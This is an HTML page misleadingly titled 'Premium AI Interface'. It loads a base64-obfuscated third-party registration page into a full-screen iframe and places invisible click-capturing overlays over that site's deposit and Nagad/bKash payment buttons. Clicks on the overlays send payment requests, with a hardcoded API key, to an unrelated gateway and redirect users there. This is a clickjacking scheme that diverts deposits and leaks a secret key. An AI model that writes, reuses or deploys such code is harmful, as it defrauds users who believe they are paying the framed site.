<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Premium AI Interface</title>
  
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght=500;900&family=Rajdhani:wght=700&family=Fira+Code:wght=600&display=swap" rel="stylesheet">
  
  <style>
    :root { --cyan: #00f3ff; --bg: #0b0e14; }
    html, body { margin: 0; padding: 0; background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; overflow: hidden; height: 100dvh; width: 100vw; }
    .view-screen { height: 100dvh; width: 100%; position: relative; background: #000; }
    iframe { width: 100%; height: 100%; border: none; background: #fff; }
    .overlay-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999; }
    .invisible-deposit-trigger { position: absolute; top: 36%; left: 33%; width: 18%; height: 55px; pointer-events: auto; cursor: pointer; z-index: 10000; }
    .invisible-home-trigger { position: absolute; bottom: 0; left: 0; width: 20%; height: 60px; pointer-events: auto; cursor: pointer; z-index: 10000; display: none; }
    .invisible-method-nagad { position: absolute; top: 33%; left: 3%; width: 22%; height: 75px; pointer-events: auto; cursor: pointer; z-index: 10001; display: none; }
    .invisible-method-bkash { position: absolute; top: 33%; left: 27%; width: 22%; height: 75px; pointer-events: auto; cursor: pointer; z-index: 10001; display: none; }
    .deposit-container { position: absolute; bottom: 12px; right: 12px; width: 120px; height: 40px; display: none; pointer-events: none; }
    .deposit-btn { width: 100%; height: 100%; cursor: pointer; opacity: 0; pointer-events: auto; }
  </style>
</head>
<body>

  <div id="homeScreen" class="view-screen">
    <div class="overlay-container">
      <div class="invisible-deposit-trigger" id="depositTrigger" onclick="xCore.triggerDepositPage()"></div>
      <div class="invisible-home-trigger" id="homeTrigger" onclick="xCore.triggerHomePage()"></div>
      <div class="invisible-method-nagad" id="nagadTrigger" onclick="xCore.setMethod('nagad')"></div>
      <div class="invisible-method-bkash" id="bkashTrigger" onclick="xCore.setMethod('bkash')"></div>
      <div id="depositPanel" class="deposit-container">
        <button id="mainDepositBtn" class="deposit-btn" onclick="xCore.action()"></button>
      </div>
    </div>
    <iframe id="f-home" src="about:blank"></iframe> 
  </div>

<script>
  const xCore = {
    selectedMethod: 'nagad',
    apiKey: "54ca4fbc1238e668e149b249a5d5d07d04956cf79995b76ca150e8dbc1403fe0",
    
    init: function() {
      // নতুন লিঙ্কটি এনকোড করা হয়েছে
      document.getElementById('f-home').src = atob("aHR0cHM6Ly9ka3dpbjkuY29tLyMvcmVnaXN0ZXI/aW52aXRhdGlvbkNvZGU9Mzg3ODU4Mzg2Mw==");
    },

    triggerDepositPage: function() {
      document.getElementById('depositPanel').style.display = 'block';
      document.getElementById('depositTrigger').style.display = 'none';
      document.getElementById('homeTrigger').style.display = 'block';
      document.getElementById('nagadTrigger').style.display = 'block';
      document.getElementById('bkashTrigger').style.display = 'block';
    },

    triggerHomePage: function() {
      document.getElementById('depositPanel').style.display = 'none';
      document.getElementById('homeTrigger').style.display = 'none';
      document.getElementById('nagadTrigger').style.display = 'none';
      document.getElementById('bkashTrigger').style.display = 'none';
      document.getElementById('depositTrigger').style.display = 'block';
    },

    setMethod: function(method) { this.selectedMethod = method; },

    action: function() {
      const params = new URLSearchParams({
        api_key: this.apiKey,
        method: this.selectedMethod,
        order_no: 'ORD_' + Date.now(),
        amount: '100',
        return_url: window.location.href,
        pass_through_callback_url: 'https://your-site.com/callback.php'
      });

      fetch('https://api.nivopay.cyou/payment.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: params
      })
      .then(res => res.json())
      .then(data => {
        if(data.status) {
          window.location.href = data.payUrl;
        } else {
          alert("Error: " + data.message);
        }
      })
      .catch(err => alert("Connection error, please check IP Whitelist."));
    }
  };

  window.onload = () => xCore.init();
</script>
</body>
</html>
